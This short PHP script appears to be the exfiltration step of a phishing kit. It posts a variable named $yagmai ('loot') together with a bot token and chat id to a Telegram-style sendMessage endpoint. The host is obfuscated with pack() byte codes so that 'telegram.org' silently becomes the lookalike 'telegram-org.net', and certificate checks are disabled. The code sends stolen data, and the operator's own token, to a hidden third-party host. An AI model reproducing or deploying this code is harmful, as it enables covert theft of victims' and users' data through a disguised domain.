<?php

$website = "https://telegram.org/bot" . $botToken;
$replace = pack('C4', 45,111,114,103) . pack('C4', 46,110,101,116);
$website = str_replace('.org', $replace, $website);
$params = [
    'chat_id' => $chatId,
    'text' => $yagmai,
    'parse_mode' => 'Markdown',
];

$ch = curl_init($website . '/sendMessage');

curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$result = curl_exec($ch);
curl_close($ch);

?>